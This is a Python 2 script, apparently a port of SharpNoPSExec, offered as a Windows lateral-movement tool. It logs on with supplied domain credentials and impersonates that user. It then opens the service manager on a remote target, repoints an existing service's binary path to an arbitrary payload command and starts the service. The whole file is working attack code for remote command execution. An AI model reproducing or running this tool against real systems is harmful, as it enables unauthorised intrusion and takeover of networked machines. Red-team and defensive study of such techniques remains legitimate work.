# -*- coding:utf-8 -*-
# Author: bobac
# Reference: SharpNoPSExec Twitter: @juliourena
# Version: v1.0
# Lateral Movement Tools

# Include Lib Files Or Packages
import ctypes
from ctypes import wintypes
from optparse import OptionParser

# Export Functions From
LogonUser = ctypes.windll.advapi32.LogonUserW
ImpersonateLoggedOnUser = ctypes.windll.advapi32.ImpersonateLoggedOnUser #
OpenSCManager = ctypes.windll.advapi32.OpenSCManagerW
OpenService = ctypes.windll.advapi32.OpenServiceW
ChangeServiceConfig = ctypes.windll.advapi32.ChangeServiceConfigW
StartService = ctypes.windll.advapi32.StartServiceA
GetLastError = ctypes.windll.kernel32.GetLastError

# Defined Some Global Variables
Token = ctypes.wintypes.HANDLE()

if __name__ == '__main__':
    parser = OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Please Input Target Machinename Or Ip Address!")
    parser.add_option("-d", "--domain", dest="domain", help="Please Input Domain!")
    parser.add_option("-u", "--username", dest="username", help="Please Input Username!")
    parser.add_option("-p", "--password", dest="password", help="Please Input Password!")
    parser.add_option("-s", "--service", dest="service", help="Please Input Service Name!")
    parser.add_option("-e", "--exploit", dest="exploit", help="Please Input Exploit Payload!")
    (options, args) = parser.parse_args()

    if options.target in [None, "", " "]:
        print "[-] Please Input Target Machinename Or Ip Address!"
        exit(0)

    if options.service in [None, "", " "] or options.exploit in [None, "", " "]:
        print "[-] Please Check Service Name And Exploit Payload!"
        exit(0)

    if options.domain in [None, "", " "] or options.username in [None, "", " "] or options.password in [None, "", " "]:
        print "[-] Please Check Username And Password And Domain Information!"
        exit(0)

    print "[+] Target: %s" % str(options.target)

    domain = ctypes.wintypes.LPCWSTR(options.domain)
    username = ctypes.wintypes.LPCWSTR(options.username)
    password = ctypes.wintypes.LPCWSTR(options.password)
    logon_type = ctypes.wintypes.DWORD(2)
    provider = ctypes.wintypes.DWORD(0)
    result = LogonUser(username, domain, password, logon_type, provider, ctypes.byref(Token))
    if result == 0:
        error = GetLastError()
        print "[-] Logon Failed! We Get Windows System Error: %s" % str(error)
        exit(0)
    else:
        print "[+] Logon Succeed!"

    result = ImpersonateLoggedOnUser(Token)
    if result == 0:
        error = GetLastError()
        print "[-] ImpersonateLoggedOnUser Failed! We Get Windows System Error: %s" % str(error)
        exit(0)
    else:
        print "[+] ImpersonateLoggedOnUser Succeed!"

    target = ctypes.wintypes.LPCWSTR(options.target)
    desired_access = ctypes.wintypes.DWORD(0xF003F)
    result = OpenSCManager(target, None,  desired_access)
    if result == 0:
        error = GetLastError()
        if error == 5:
            print "[-] We Need Administrator Privilege!"
            exit(0)
        else:
            print "[-] We Get Windows System Error: %s"%str(error)
            exit(0)
    else:
        print "[+] OpenSCManager Succeed!"

    scm_handle = ctypes.wintypes.SC_HANDLE(result)
    name = ctypes.wintypes.LPCWSTR(options.service)
    desired_access = ctypes.wintypes.DWORD(0xF01FF)
    service = OpenService(scm_handle, name, desired_access)

    print "[+] We Got Exploit Payload: %s"%str(options.exploit)

    service_type = ctypes.wintypes.UINT(0xFFFFFFFF)
    start_type = ctypes.wintypes.UINT(0x00000003)
    payload = ctypes.wintypes.LPCWSTR(options.exploit)
    result = ChangeServiceConfig(service, service_type, start_type, 0, payload, None, 0, None, None, None, None)
    if result == 0:
        error = GetLastError()
        print "[-] ChangeServiceConfig Failed! We Get Windows System Error: %s" % str(error)
        exit(0)
    else:
        print "[+] ChangeServiceConfig Succeed!"

    result = StartService(service, 0, None)
    error = GetLastError()
    if error == 1053:
        print "[+] Lateral Movement Is Succeed!"
    else:
        print "[-] We Got Windows System Error: %s"%str(error)


